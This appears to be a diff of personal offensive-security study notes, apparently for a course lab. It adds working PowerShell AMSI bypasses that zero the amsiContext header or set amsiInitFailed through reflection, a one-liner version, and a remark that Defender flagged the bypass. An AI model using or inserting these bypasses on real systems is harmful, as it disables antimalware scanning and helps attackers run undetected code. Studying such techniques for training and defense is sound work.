@@ -466,3 +466,40 @@ Frida provides a powerful and flexible framework for dynamic instrumentation, al
 $a=[Ref].Assembly.GetTypes()
 Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
 ```
+- PowerShell stores information about AMSI in managed code inside the _System.Management.Automation.AmsiUtils_ class
+
+##### Overwrite the amsiContext header with zeros:
+```powershell
+$a=[Ref].Assembly.GetTypes()
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
+$d=$c.GetFields('NonPublic,Static')
+Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
+$g=$f.GetValue($null)
+[IntPtr]$ptr=$g
+[Int32[]]$buf=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+- this will force AmsiOpenSession to error out
+- *Note:* had to run this 3-4 times on Win10 to get the header overwritten with zeros (was flagged by Defender...Real Time protection was *On*)
+- one-liner:
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+- Another amsi bypass using amsiInitFailed (Win10...errors on Win11 arm)
+```powershell
+$a=[Ref].Assembly.GetTypes()
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
+$d=$c.GetFields('NonPublic,Static')
+Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
+$g=$f.SetValue($null,$true)
+```
+### TODO: Try doing AMSI bypass in C#
+
+### TODO 7.4.2 Q2 
+- cannot get wmi to work on homelab instance
+
+#### 7.4.2 Extra Mile
+
+Create a similar AMSI bypass but instead of modifying the code of _AmsiOpenSession_, find a suitable instruction to change in _AmsiScanBuffer_ and implement it from reflective PowerShell.
+- https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
+- 
